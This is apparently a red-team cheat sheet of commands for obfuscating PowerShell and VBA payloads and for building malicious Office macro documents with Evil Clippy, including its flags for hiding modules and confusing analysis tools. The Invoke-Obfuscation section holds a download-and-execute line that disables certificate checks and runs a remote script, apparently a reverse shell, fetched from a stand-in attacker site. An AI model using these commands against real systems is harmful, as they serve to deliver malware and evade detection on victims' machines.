```
python3 powerob.py obfuscate originalfile.ps1 obfuscatedfile.ps1
python3 obfuscate.py orgi.vbs --output /tmp/obfuscate.vba
```

### Invoke-Obfuscation
```
SetExecutionPolicy remotesigned
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
set scriptblock IEX '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}'; IEX (New-Object Net.WebClient).DownloadString('https://my.evilsite/revc.ps1')
```
### Evil Clippy
```
EvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc
Evil Clippy can automatically hide all modules with the -g flag:
EvilClippy.exe -g macrofile.doc
Evil Clippy can confuse pcodedmp and many other analysis tools with the -r flag.
EvilClippy.exe -r macrofile.doc
EvilClippy.exe -s t.vba -g -d -r -u mal_doc.docm
```
